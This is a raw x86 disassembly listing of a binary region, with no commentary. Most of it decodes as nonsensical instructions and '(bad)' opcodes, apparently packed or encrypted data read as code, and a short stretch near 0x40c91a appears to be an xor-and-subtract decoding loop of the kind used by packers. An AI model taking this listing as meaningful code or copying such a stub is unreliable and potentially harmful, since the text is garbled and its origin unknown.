  40c649:	aad    0xb2
  40c64b:	push   DWORD PTR [edi-0x183d2bd7]
  40c651:	pop    es
  40c652:	adc    cl,BYTE PTR [edi-0x4e]
  40c655:	es das 
  40c657:	jmp    0xc796:0xa05bd41f
  40c65e:	cwde   
  40c65f:	or     eax,DWORD PTR ds:0x81553ec4
  40c665:	xor    eax,0x6d4fac02
  40c66a:	hlt    
  40c66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c66c:	inc    ebp
  40c66d:	and    BYTE PTR [eax-0x64],0xd7
  40c671:	pop    ebx
  40c672:	daa    
  40c673:	mov    al,0x8e
  40c675:	iret   
  40c676:	ins    BYTE PTR es:[edi],dx
  40c677:	loopne 0x40c6bd
  40c679:	out    0x34,eax
  40c67b:	mov    edi,0x35698088
  40c680:	jle    0x40c619
  40c682:	out    dx,eax
  40c683:	mov    esp,0x763bcb01
  40c688:	adc    eax,0x9e6b4e3
  40c68d:	inc    esp
  40c68e:	mov    ds:0x89eb4833,eax
  40c693:	addr16 jbe 0x40c635
  40c696:	or     al,0x58
  40c698:	xor    ecx,edx
  40c69a:	arpl   sp,sp
  40c69c:	rol    DWORD PTR [ebp+0x64],1
  40c69f:	cmp    BYTE PTR [edi-0x20],dh
  40c6a2:	fdiv   QWORD PTR [ecx+edx*4]
  40c6a5:	mov    edi,0xf319ae8a
  40c6aa:	cmp    ah,BYTE PTR [esi]
  40c6ac:	inc    ebx
  40c6ad:	scas   al,BYTE PTR es:[edi]
  40c6ae:	inc    edi
  40c6af:	repz out 0x90,al
  40c6b2:	jge    0x40c67c
  40c6b4:	cdq    
  40c6b5:	addr16 push ds
  40c6b7:	test   al,0xeb
  40c6b9:	ss jecxz 0x40c69f
  40c6bc:	imul   ecx,DWORD PTR [edx+0x47],0xffffffa4
  40c6c0:	jl     0x40c6b3
  40c6c2:	mov    ch,0x27
  40c6c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6c5:	jb     0x40c66c
  40c6c7:	popf   
  40c6c8:	daa    
  40c6c9:	cmp    ebx,DWORD PTR [edx+0x2]
  40c6cc:	mov    al,0x2b
  40c6ce:	adc    edx,ecx
  40c6d0:	xchg   BYTE PTR [esi+0x26],bl
  40c6d3:	xchg   esi,eax
  40c6d4:	mov    dl,0xfa
  40c6d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6d7:	sahf   
  40c6d8:	retf   0x3af6
  40c6db:	cmp    BYTE PTR [esi+0x41],bh
  40c6de:	lahf   
  40c6df:	fdiv   QWORD PTR [ebx-0x43]
  40c6e2:	lock sar BYTE PTR [ebx+0x70],cl
  40c6e6:	daa    
  40c6e7:	jo     0x40c694
  40c6e9:	mov    bh,0xd8
  40c6eb:	scas   al,BYTE PTR es:[edi]
  40c6ec:	jle    0x40c749
  40c6ee:	fadd   DWORD PTR [ebx]
  40c6f0:	inc    eax
  40c6f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6f2:	test   al,0xb8
  40c6f4:	mov    ebp,0xbda339f7
  40c6f9:	pop    esi
  40c6fa:	test   al,0x6e
  40c6fc:	pop    edx
  40c6fd:	dec    edx
  40c6fe:	inc    eax
  40c6ff:	loop   0x40c718
  40c701:	scas   eax,DWORD PTR es:[edi]
  40c702:	fsubr  DWORD PTR [esi-0x4f]
  40c705:	dec    BYTE PTR [ebx-0x64]
  40c708:	xor    DWORD PTR [eax+0x6117e378],eax
  40c70e:	sub    al,BYTE PTR [esi]
  40c710:	jb     0x40c6c3
  40c712:	xor    eax,0x6bb898ae
  40c717:	popf   
  40c718:	fdivr  DWORD PTR [esp+ebx*2]
  40c71b:	push   0x9f91afb5
  40c720:	dec    esp
  40c721:	aad    0xe3
  40c723:	mov    WORD PTR [edx-0x55],?
  40c726:	daa    
  40c727:	inc    ebx
  40c728:	out    0x3e,eax
  40c72a:	mov    al,0xd1
  40c72c:	pop    ds
  40c72d:	xchg   esi,eax
  40c72e:	jecxz  0x40c6e0
  40c730:	das    
  40c731:	adc    BYTE PTR [edx+0x36c2bdc5],bl
  40c737:	int3   
  40c738:	pop    ebx
  40c739:	push   ds
  40c73a:	mov    dh,0x44
  40c73c:	lahf   
  40c73d:	sub    ch,BYTE PTR [eax]
  40c73f:	scas   al,BYTE PTR es:[edi]
  40c740:	push   cs
  40c741:	dec    edx
  40c742:	mov    esp,0xcf2200fa
  40c747:	mov    eax,0x7feeeeaf
  40c74c:	cmc    
  40c74d:	sar    BYTE PTR [ecx+0x37c529ec],cl
  40c753:	xchg   ebp,eax
  40c754:	push   es
  40c755:	and    DWORD PTR [ebp-0x62],ecx
  40c758:	cdq    
  40c759:	jmp    0xcb1d825a
  40c75e:	repnz dec edi
  40c760:	mov    DWORD PTR ds:0x452f4366,ebp
  40c766:	push   ebx
  40c767:	test   dh,cl
  40c769:	in     eax,0x46
  40c76b:	mov    BYTE PTR [ebp+0x15],dl
  40c76e:	(bad)  
  40c76f:	rol    esp,1
  40c771:	mov    edx,0x312d7aa5
  40c776:	cld    
  40c777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c778:	mov    WORD PTR [eax+edi*2],cs
  40c77b:	and    eax,0x4a43cb49
  40c780:	sub    al,0x8
  40c782:	call   0x6c7a:0xfb579f7
  40c789:	push   esp
  40c78a:	mov    al,ah
  40c78c:	cli    
  40c78d:	repz das 
  40c78f:	jmp    0x8361081a
  40c794:	aas    
  40c795:	and    al,BYTE PTR [ebx-0x53863ed0]
  40c79b:	mov    esi,0x679dacd6
  40c7a0:	dec    eax
  40c7a1:	idiv   ecx
  40c7a3:	ret    
  40c7a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7a5:	jg     0x40c7b5
  40c7a7:	cmc    
  40c7a8:	fdivr  DWORD PTR [esi+edx*1-0x62]
  40c7ac:	out    dx,eax
  40c7ad:	pop    esi
  40c7ae:	dec    eax
  40c7af:	and    BYTE PTR [ecx-0xda5e4c4],dl
  40c7b5:	fmul   QWORD PTR [esi-0x3c]
  40c7b8:	outs   dx,BYTE PTR ds:[esi]
  40c7b9:	jb     0x40c73d
  40c7bb:	ror    DWORD PTR [edx-0x1fa3ab32],0x33
  40c7c2:	out    0x9a,al
  40c7c4:	(bad)  
  40c7c5:	sub    al,0xd
  40c7c7:	aas    
  40c7c8:	and    eax,0xc7bf1cd2
  40c7cd:	enter  0xe1aa,0x82
  40c7d1:	and    eax,0x54b0245a
  40c7d6:	or     ch,dl
  40c7d8:	adc    al,dh
  40c7da:	int3   
  40c7db:	xor    edi,edi
  40c7dd:	pusha  
  40c7de:	pop    esi
  40c7df:	jl     0x40c840
  40c7e1:	pop    ebx
  40c7e2:	repz ja 0x40c7af
  40c7e5:	ret    
  40c7e6:	mov    cl,0x84
  40c7e8:	xor    ch,BYTE PTR [edx+0x29]
  40c7eb:	fldenv [ebx+0x45127f45]
  40c7f1:	dec    edi
  40c7f2:	icebp  
  40c7f3:	call   0x3f33:0x1b408e78
  40c7fa:	repz and DWORD PTR [edx+0x2739790e],eax
  40c801:	mov    cl,0x67
  40c803:	sub    al,0x8
  40c805:	sbb    ah,0xd4
  40c808:	sahf   
  40c809:	stos   DWORD PTR es:[edi],eax
  40c80a:	popf   
  40c80b:	jge    0x40c88a
  40c80d:	xor    ecx,DWORD PTR [esp+eax*1]
  40c810:	aad    0x84
  40c812:	mov    ch,0x69
  40c814:	inc    ebx
  40c815:	jecxz  0x40c7c8
  40c817:	xchg   ebx,eax
  40c818:	sbb    al,0x8c
  40c81a:	jo     0x40c893
  40c81c:	and    esp,DWORD PTR [esi]
  40c81e:	mov    al,ds:0x72955c3c
  40c823:	dec    esi
  40c824:	fild   QWORD PTR [edx]
  40c826:	nop
  40c827:	int    0xb0
  40c829:	pusha  
  40c82a:	mov    BYTE PTR [ebx+0x2bac3561],dh
  40c830:	setge  BYTE PTR [esi+0x22497410]
  40c837:	or     ebx,DWORD PTR [ebp-0x33]
  40c83a:	stos   DWORD PTR es:[edi],eax
  40c83b:	xchg   edi,eax
  40c83c:	inc    esp
  40c83d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c83e:	push   ebx
  40c83f:	push   ebx
  40c840:	cmp    eax,0x174b2829
  40c845:	(bad)  gs:[esi+0x77b23ddb]
  40c84c:	and    al,0xc1
  40c84e:	cmc    
  40c84f:	inc    edx
  40c850:	cld    
  40c851:	call   0x2095546
  40c856:	pop    eax
  40c857:	bound  esp,QWORD PTR [esi+edx*4+0x51]
  40c85b:	xchg   edx,eax
  40c85c:	push   edi
  40c85d:	sbb    edi,DWORD PTR ds:0x4bc94ff2
  40c863:	out    dx,eax
  40c864:	cmc    
  40c865:	es int3 
  40c867:	pop    ebx
  40c868:	xor    edx,esi
  40c86a:	mov    ah,0x1e
  40c86c:	mov    WORD PTR [ebp+0x37ae01d],gs
  40c872:	inc    edx
  40c873:	call   0x6782:0xcd31ed97
  40c87a:	mov    dl,BYTE PTR [ebp+0x13]
  40c87d:	dec    ebp
  40c87e:	xor    edx,0xc54c74a6
  40c884:	es cmc 
  40c886:	loop   0x40c853
  40c888:	or     ebx,DWORD PTR [edx+0x66]
  40c88b:	inc    edx
  40c88c:	loopne 0x40c834
  40c88e:	out    0x9,eax
  40c890:	push   es
  40c891:	aad    0x62
  40c893:	mov    edx,0x78849d64
  40c898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c899:	push   es
  40c89a:	div    DWORD PTR [edx-0xb29008a]
  40c8a0:	mov    ebp,0xf720a4da
  40c8a5:	mov    bl,BYTE PTR [esi+0x87848c3]
  40c8ab:	cmp    eax,0xf0a72d83
  40c8b0:	fwait
  40c8b1:	dec    esp
  40c8b2:	push   cs
  40c8b3:	pop    edi
  40c8b4:	mov    ?,WORD PTR [esi+0x53]
  40c8b7:	das    
  40c8b8:	outs   dx,DWORD PTR ds:[esi]
  40c8b9:	addr16 sti 
  40c8bb:	cs mov cl,0xb1
  40c8be:	ror    DWORD PTR [ebx-0x36],0xc5
  40c8c2:	lahf   
  40c8c3:	stos   BYTE PTR es:[edi],al
  40c8c4:	inc    esp
  40c8c5:	(bad)
  40c8c8:	pop    ebp
  40c8c9:	loope  0x40c8bc
  40c8cb:	ds mov dl,0x68
  40c8ce:	xchg   edi,eax
  40c8cf:	cmp    al,0x3d
  40c8d1:	lea    esi,[esp+eax*4-0x473459d4]
  40c8d8:	xor    eax,0x2dccd853
  40c8dd:	test   eax,0x269f26c1
  40c8e2:	push   0x5d
  40c8e4:	test   eax,0x32539ba2
  40c8e9:	stc    
  40c8ea:	push   fs
  40c8ec:	pop    ebx
  40c8ed:	test   DWORD PTR [edx],ebp
  40c8ef:	(bad)  [esi-0x3f84bdd8]
  40c8f5:	idiv   DWORD PTR [esi]
  40c8f7:	and    ch,dl
  40c8f9:	adc    BYTE PTR [edi-0x4f],bl
  40c8fc:	adc    DWORD PTR [edi+0x6],0xffffffc4
  40c900:	adc    BYTE PTR [edx+edx*4+0x29],bh
  40c904:	inc    esi
  40c905:	xor    BYTE PTR [ebp-0x79f65e24],dl
  40c90b:	and    ch,BYTE PTR ds:0x31be7082
  40c911:	int3   
  40c912:	xchg   edx,eax
  40c913:	inc    eax
  40c914:	jb     0x40c8ca
  40c916:	repz out 0xf,eax
  40c919:	cld    
  40c91a:	mov    eax,DWORD PTR [ebp-0x20]
  40c91d:	mov    edx,DWORD PTR [ebp-0x8]
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x8f4c5e53
  40c96a:	jb     0x40c996
  40c96c:	ja     0x40c9a0
  40c96e:	popf   
  40c96f:	js     0x40c9e9
  40c971:	je     0x40c9f1
  40c973:	js     0x40c9ed
  40c975:	xor    BYTE PTR [eax+0x61056d05],al
  40c97b:	cmp    ebp,edx
  40c97d:	add    esi,DWORD PTR [ecx]
  40c97f:	cmc    
  40c980:	nop
  40c981:	mov    BYTE PTR [eax],0x1e
  40c984:	(bad)  
  40c985:	xchg   edx,eax
  40c986:	arpl   WORD PTR ds:0x46c48ce6,di
  40c98c:	jbe    0x40c9f7
  40c98e:	fmulp  st(7),st
  40c990:	push   edi
  40c991:	je     0x40ca08
  40c993:	out    0xbc,al
  40c995:	sbb    eax,0x3f4d5eb5
  40c99a:	jns    0x40c98e
  40c99c:	rcl    BYTE PTR [ecx],0x4c
  40c99f:	push   ss
  40c9a0:	inc    ecx
  40c9a1:	fbstp  TBYTE PTR [eax+0xa]
  40c9a4:	loopne 0x40c94e
  40c9a6:	shl    BYTE PTR [edi+0x23],1
  40c9a9:	arpl   WORD PTR [ebp+0x1be76178],bx
  40c9af:	les    ecx,FWORD PTR [edi]
  40c9b1:	lea    esi,[esi]
  40c9b3:	dec    ecx
  40c9b4:	and    eax,DWORD PTR [edi]
  40c9b6:	adc    ecx,edx
  40c9b8:	mov    eax,ds:0xc3548706
  40c9bd:	add    al,0xce
  40c9bf:	stos   DWORD PTR es:[edi],eax
  40c9c0:	xchg   ebp,eax
  40c9c1:	out    0xdd,eax
  40c9c3:	fcmovu st,st(1)
  40c9c5:	int    0xd2
  40c9c7:	push   ebx
  40c9c8:	mov    cl,0x3c
  40c9ca:	popa   
  40c9cb:	mov    ecx,0xea285d0
  40c9d0:	and    BYTE PTR [edi],0x83
  40c9d3:	dec    edx
  40c9d4:	inc    ecx
  40c9d5:	inc    ebx
  40c9d6:	xor    ecx,DWORD PTR [esi-0x5d1593d1]
  40c9dc:	mov    edi,0xfe215557
  40c9e1:	in     eax,0x12
  40c9e3:	inc    edi
  40c9e4:	and    dl,BYTE PTR [esi-0x2f]
  40c9e7:	dec    esp
  40c9e8:	popa   
  40c9e9:	jecxz  0x40c9d8
  40c9eb:	sahf   
  40c9ec:	and    al,0x65
  40c9ee:	dec    edx
  40c9ef:	loop   0x40ca38
  40c9f1:	adc    DWORD PTR [ebp+0x77],edi
  40c9f4:	pop    esp
  40c9f5:	mov    ds:0x6e86d900,eax
  40c9fa:	dec    eax
  40c9fb:	xchg   ecx,eax
  40c9fc:	inc    esi
  40c9fd:	ror    DWORD PTR [ebp+0x52161ad7],1
  40ca03:	(bad)  
  40ca04:	scas   al,BYTE PTR es:[edi]
  40ca05:	mov    ecx,0x5577bdf6
  40ca0a:	and    dh,al
  40ca0c:	inc    edi
  40ca0d:	jl     0x40ca41
  40ca0f:	mov    cl,0x50
  40ca11:	xchg   BYTE PTR [edi-0x80],cl
  40ca14:	inc    edx
  40ca15:	xlat   BYTE PTR ds:[ebx]
  40ca16:	sub    ch,BYTE PTR [ecx+0x21e4e170]
  40ca1c:	hlt    
  40ca1d:	neg    BYTE PTR [edi+0x26]
  40ca20:	sub    al,dh
  40ca22:	stc    
  40ca23:	sbb    ah,BYTE PTR [ebx+0x2c]
  40ca26:	ins    BYTE PTR es:[edi],dx
  40ca27:	mov    edx,DWORD PTR [ebx+0x33]
  40ca2a:	mov    ebp,0x80eb920e
  40ca2f:	adc    edx,edx
  40ca31:	dec    eax
  40ca32:	aad    0xde
  40ca34:	ss or  bh,bh
  40ca37:	dec    edi
  40ca38:	mov    ds:0x2d719b5b,eax
  40ca3d:	(bad)  
  40ca3f:	dec    esp
  40ca40:	push   eax
  40ca41:	add    DWORD PTR [ecx],ebp
  40ca43:	in     eax,0x5d
  40ca45:	pop    ds
  40ca46:	push   edx
  40ca47:	bound  ecx,QWORD PTR [edx-0x24bc5dbd]
  40ca4d:	xlat   BYTE PTR ds:[ebx]
  40ca4e:	push   edi
  40ca4f:	and    dh,BYTE PTR [edi-0xb]
  40ca52:	and    cl,bl
  40ca54:	xor    al,0x55
  40ca56:	mov    bh,0xaf
  40ca58:	and    bl,BYTE PTR [eax-0x7]
  40ca5b:	loope  0x40ca47
  40ca5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca5e:	jae    0x40c9ea
  40ca60:	loop   0x40ca28
  40ca62:	mov    esi,0x10d4e3ae
  40ca67:	cli    
  40ca68:	ins    DWORD PTR es:[edi],dx
  40ca69:	mov    al,0x61
  40ca6b:	xchg   esp,eax
  40ca6c:	push   ebp
  40ca6d:	(bad)  
  40ca6e:	fbld   TBYTE PTR [ebx+0x301a82ef]
  40ca74:	xchg   ebx,eax
  40ca75:	mov    ebp,0x22cab42
  40ca7a:	test   eax,0x737437b8
  40ca7f:	jecxz  0x40cabc
  40ca81:	loopne 0x40cabe
  40ca83:	or     BYTE PTR [ebp+ecx*4-0x5b1bdf64],al
  40ca8a:	dec    ecx
  40ca8b:	test   eax,0xf9d7f41e
  40ca90:	jb     0x40cad6
  40ca92:	jg     0x40cabe
  40ca94:	and    dh,BYTE PTR [esi-0x7a974076]
  40ca9a:	lock test al,0xa9
  40ca9d:	dec    ecx
  40ca9e:	cli    
  40ca9f:	add    edx,DWORD PTR [ebx+0x329f16b8]
  40caa5:	cs and ch,0xb2
  40caa9:	inc    eax
  40caaa:	xor    edi,DWORD PTR fs:[ebx+0x3e]
  40caae:	test   BYTE PTR [ecx+0x7bd017e2],cl
  40cab4:	jnp    0x40cafb
  40cab6:	(bad)  
  40cab7:	ficom  WORD PTR [ebp+0x5e]
  40caba:	int3   
  40cabb:	pop    edx
  40cabc:	test   DWORD PTR [edi+ebp*1],edx
  40cabf:	push   ebx
  40cac0:	das    
  40cac1:	test   DWORD PTR [edi+0x72],esp
  40cac4:	retf   
  40cac5:	or     DWORD PTR [ecx],0xffffffc3
  40cac8:	ja     0x40ca5a
  40caca:	mov    ds:0xd3109e65,al
  40cacf:	and    DWORD PTR [ebp-0x2e],edx
  40cad2:	pushf  
  40cad3:	outs   dx,DWORD PTR ds:[esi]
  40cad4:	push   edx
  40cad5:	xor    al,0xef
  40cad7:	cld    
  40cad8:	mov    dh,0x1f
  40cada:	into   
  40cadb:	loope  0x40cb21
  40cadd:	arpl   WORD PTR [edi-0xf],ax
  40cae0:	lods   al,BYTE PTR ds:[esi]
  40cae1:	inc    esi
  40cae2:	push   edx
  40cae3:	pushf  
  40cae4:	in     al,dx
  40cae5:	lods   eax,DWORD PTR ds:[esi]
  40cae6:	cmp    eax,0xede27b1f
  40caeb:	adc    al,BYTE PTR [ecx+0x51211367]
  40caf1:	sti    
  40caf2:	jecxz  0x40caeb
  40caf4:	or     DWORD PTR [ecx+0x7df4b8b2],esi
  40cafa:	jnp    0x40cb1b
  40cafc:	and    BYTE PTR [eax+0x58],dl
  40caff:	loope  0x40cb2b
  40cb01:	dec    esp
  40cb02:	jnp    0x40cab8
  40cb04:	mov    ah,0xd2
  40cb06:	add    eax,DWORD PTR ds:0xfaa5778c
  40cb0c:	daa    
  40cb0d:	mov    ch,0x34
  40cb0f:	jecxz  0x40cabd
  40cb11:	or     al,0xbf
  40cb13:	call   0x20c5:0x5c1188ee
  40cb1a:	scas   al,BYTE PTR es:[edi]
  40cb1b:	cs cmp al,ah
  40cb1e:	xchg   edx,eax
  40cb1f:	mov    ds:0x60ef6ab8,eax
  40cb24:	daa    
  40cb25:	(bad)  
  40cb26:	jle    0x40cadd
  40cb28:	out    0x67,eax
  40cb2a:	(bad)  
  40cb2b:	mov    bl,0xc6
  40cb2d:	cmovne esi,DWORD PTR [edi]
  40cb30:	adc    ch,BYTE PTR [ecx-0x746653e5]
  40cb36:	mov    edx,0xe2e1ab68
  40cb3b:	xchg   esp,eax
  40cb3c:	xor    al,0xc2
  40cb3e:	or     BYTE PTR [ebp+0x60cecd2a],dh
  40cb44:	lock push esp
  40cb46:	rcr    BYTE PTR [edi],0x30
  40cb49:	inc    ebx
  40cb4a:	mov    ecx,DWORD PTR [ecx+0x450a2b9b]
  40cb50:	stos   DWORD PTR es:[edi],eax
  40cb51:	jo     0x40cb7b
  40cb53:	sub    ch,bl
  40cb55:	clts   
  40cb57:	xchg   BYTE PTR [ebx-0x3b4ad312],dh
  40cb5d:	out    0x3b,al
  40cb5f:	or     DWORD PTR [edi+0x69],0xffffff85
  40cb63:	inc    ebx
  40cb64:	or     al,0xd3
  40cb66:	test   DWORD PTR gs:[eax+eiz*8-0x63],edi
  40cb6b:	imul   eax,DWORD PTR ds:0x7416419a,0xa0cd408
  40cb75:	jbe    0x40cb05
  40cb77:	fwait
  40cb78:	cmp    al,0x4e
  40cb7a:	mov    bh,0x67
  40cb7c:	leave  
  40cb7d:	adc    edx,DWORD PTR [esi+0x57]
  40cb80:	(bad)  
  40cb81:	sbb    ecx,DWORD PTR [edx]
  40cb83:	xchg   BYTE PTR gs:[ecx],ah
  40cb86:	cmc    
  40cb87:	leave  
  40cb88:	sbb    BYTE PTR [eax+0x363639bf],ch
  40cb8e:	cmp    edx,esi
  40cb90:	pop    ds
  40cb91:	mov    bl,0xe0
  40cb93:	or     dh,BYTE PTR [edx+0x6a]
  40cb96:	sub    al,0x35
  40cb98:	mov    ds:0x568a4397,al
  40cb9d:	lods   eax,DWORD PTR ds:[esi]
  40cb9e:	mov    ds:0x220dede4,eax
  40cba3:	dec    ebp
  40cba4:	push   esp
  40cba5:	jmp    0x40cb96
  40cba7:	sti    
  40cba8:	push   eax
  40cba9:	cdq    
  40cbaa:	ins    BYTE PTR es:[edi],dx
  40cbab:	out    0x9d,eax
  40cbad:	popa   
  40cbae:	std    
  40cbaf:	shl    BYTE PTR [ebx-0x3f],1
  40cbb2:	neg    DWORD PTR [ecx+0x66]
  40cbb5:	adc    cl,ch
  40cbb7:	test   eax,0x8d01160e
  40cbbc:	aaa    
  40cbbd:	xchg   esp,eax
  40cbbe:	inc    ebp
  40cbbf:	cld    
  40cbc0:	inc    esp
  40cbc1:	xor    ch,ch
  40cbc3:	jmp    0xf2b41ff4
  40cbc8:	bound  esi,QWORD PTR [esi+0x77aa20a7]
  40cbce:	and    DWORD PTR [ebp+0x50],ebx
  40cbd1:	cmp    eax,0xc35043c9
  40cbd6:	mov    cl,0xf2
  40cbd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbd9:	call   0x1740:0x558371a0
  40cbe0:	loop   0x40cc01
  40cbe2:	jmp    0x19b2:0x723dc0f0
  40cbe9:	in     eax,dx
  40cbea:	jmp    0xc346:0x3a886e72
  40cbf1:	out    dx,eax
  40cbf2:	pop    ecx
  40cbf3:	jp     0x40cbc1
  40cbf5:	fwait
  40cbf6:	lock arpl WORD PTR [eax+0x5b],ax
  40cbfa:	out    0xff,al
  40cbfc:	pop    esi
  40cbfd:	sbb    BYTE PTR [ebx+edi*8-0x6b],dl
  40cc01:	xchg   esi,eax
  40cc02:	fwait
  40cc03:	jl     0x40cc27
  40cc05:	mov    ch,0xe4
  40cc07:	(bad)  
  40cc08:	(bad)  
  40cc09:	or     BYTE PTR [ecx],ch
  40cc0b:	xchg   DWORD PTR cs:[ebx],edx
  40cc0e:	pop    ss
  40cc0f:	fstp   QWORD PTR [ebp-0x6538fb69]
  40cc15:	sbb    DWORD PTR [ebx+0x64],ebx
  40cc18:	pop    ds
  40cc19:	mov    ecx,0x8e88de9a
  40cc1e:	dec    esp
  40cc1f:	call   0x87041535
  40cc24:	fwait
  40cc25:	arpl   WORD PTR [eax-0x7e],sp
  40cc28:	pop    ecx
  40cc29:	imul   edx,eax,0x47
  40cc2c:	xor    ah,ah
  40cc2e:	dec    edi
  40cc2f:	aam    0xb1
  40cc31:	in     eax,dx
  40cc32:	mov    bl,0xf3
  40cc34:	lods   al,BYTE PTR ds:[esi]
  40cc35:	mov    edi,0x1954557e
  40cc3a:	stc    
  40cc3b:	cli    
  40cc3c:	mov    BYTE PTR [ebp+0x14],dl
  40cc3f:	push   0x490da3d8
  40cc44:	xchg   BYTE PTR [edi],cl
  40cc46:	iret   
  40cc47:	pop    esp
  40cc48:	aaa    
  40cc49:	test   ax,0xd955
  40cc4d:	xor    BYTE PTR [ebx-0x4f],bl
  40cc50:	stos   DWORD PTR es:[edi],eax
  40cc51:	jle    0x40cbf2
  40cc53:	adc    DWORD PTR [esi-0x40],esp
  40cc56:	scas   eax,DWORD PTR es:[edi]
  40cc57:	out    0x86,eax
  40cc59:	pop    esp
  40cc5a:	xlat   BYTE PTR ds:[ebx]
  40cc5b:	and    eax,0x4c96628d
  40cc60:	retf   
  40cc61:	sub    dl,BYTE PTR [ecx]
  40cc63:	(bad)  
  40cc65:	dec    eax
  40cc66:	add    DWORD PTR [esi+0xc],0x32
  40cc6a:	daa    
  40cc6b:	nop
  40cc6c:	inc    ebp
  40cc6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc6e:	xchg   ecx,eax
  40cc6f:	(bad)  
  40cc70:	adc    BYTE PTR [ecx],bh
  40cc72:	cmp    cl,ch
  40cc74:	adc    al,0x3
  40cc76:	add    BYTE PTR [eax],al
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0x43
  40cc85:	pop    es
  40cc86:	inc    esp
  40cc87:	(bad)  [esi]
  40cc89:	mov    ds:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	xchg   ebx,eax
  40cc91:	loopne 0x40cc24
  40cc93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc94:	sub    al,0x3c
  40cc96:	pop    esi
  40cc97:	pop    edx
  40cc98:	xchg   ebp,eax
  40cc99:	and    eax,0x64ee8cbc
  40cc9e:	and    edi,DWORD PTR [esp+ebp*2+0x6a685d72]
  40cca5:	mov    ch,0x4a
  40cca7:	sti    
  40cca8:	outs   dx,DWORD PTR ds:[esi]
  40cca9:	sub    DWORD PTR [edi+0x3a],0x3b7849a0
  40ccb0:	adc    BYTE PTR [edi+0x27618bc],ch
  40ccb6:	push   0xffffff8a
  40ccb8:	pop    eax
  40ccb9:	cmp    DWORD PTR ds:0xc1da13d0,0xffffffc8
  40ccc0:	jb     0x40cd22
  40ccc2:	ins    DWORD PTR es:[edi],dx
  40ccc3:	cs ret 
  40ccc5:	fist   DWORD PTR [ecx]
  40ccc7:	(bad)  
  40ccc8:	cwde   
  40ccc9:	ret    
  40ccca:	sbb    eax,0x8ad3f43d
  40cccf:	shl    DWORD PTR [edx+0x85dcab6],0x23
  40ccd6:	jp     0x40cca7
  40ccd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccd9:	outs   dx,BYTE PTR ds:[esi]
  40ccda:	cli    
  40ccdb:	add    bh,BYTE PTR [eax-0x4]
  40ccde:	jns    0x40ccba
  40cce0:	mov    esi,0x3c1ddfe1
  40cce5:	or     eax,0x208b559c
  40ccea:	pop    eax
  40cceb:	push   cs
  40ccec:	pop    edi
  40cced:	ds loope 0x40cd2c
  40ccf0:	mov    ?,WORD PTR [eax]
  40ccf2:	push   esi
  40ccf3:	fcmovb st,st(2)
  40ccf5:	pop    ds
  40ccf6:	and    BYTE PTR [ecx-0x6c],ch
  40ccf9:	aad    0x5e
  40ccfb:	out    0xe2,eax
  40ccfd:	call   0x3d762635
  40cd02:	mov    edx,0x8468a6a0
  40cd07:	je     0x40cce1
  40cd09:	hlt    
  40cd0a:	mov    esi,0x3a7bfe2c
  40cd0f:	mov    gs,WORD PTR [edx]
  40cd11:	jg     0x40ccdb
  40cd13:	adc    BYTE PTR [edx-0x6eae09b],al
  40cd19:	iret   
  40cd1a:	out    dx,al
  40cd1b:	mov    edx,DWORD PTR [edi]
  40cd1d:	add    BYTE PTR [eax-0x4cd0012d],bl
  40cd23:	sbb    BYTE PTR [eax-0x6b06bc72],al
  40cd29:	mov    ecx,ecx
  40cd2b:	scas   al,BYTE PTR es:[edi]
  40cd2c:	sub    al,0xd2
  40cd2e:	xor    esi,ebx
  40cd30:	in     al,0x43
  40cd32:	jns    0x40cd63
  40cd34:	mov    edx,0xedf7e07a
  40cd39:	enter  0x1eac,0xde
  40cd3d:	scas   eax,DWORD PTR es:[edi]
  40cd3e:	in     al,0x60
  40cd40:	sbb    al,0xdc
  40cd42:	(bad)  
  40cd44:	icebp  
  40cd45:	fidivr DWORD PTR [ebp-0x3]
  40cd48:	push   edx
  40cd49:	stos   DWORD PTR es:[edi],eax
  40cd4a:	shr    DWORD PTR [eax+0x71bb2279],1
  40cd50:	and    ch,BYTE PTR [edi]
  40cd52:	mov    dl,0x9d
  40cd54:	pop    ss
  40cd55:	scas   al,BYTE PTR es:[edi]
  40cd56:	mov    edi,0xf4a1b1bf
  40cd5b:	(bad)  
  40cd5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd5d:	xchg   edi,eax
  40cd5e:	jle    0x40cdb3
  40cd60:	loope  0x40cdda
  40cd62:	xchg   ebp,eax
  40cd63:	jmp    0xd9a52121
  40cd68:	ds ins DWORD PTR es:[edi],dx
  40cd6a:	jnp    0x40cd29
  40cd6c:	mov    bl,0x14
  40cd6e:	cmp    eax,0xc2cd8089
  40cd73:	adc    edx,DWORD PTR [edi]
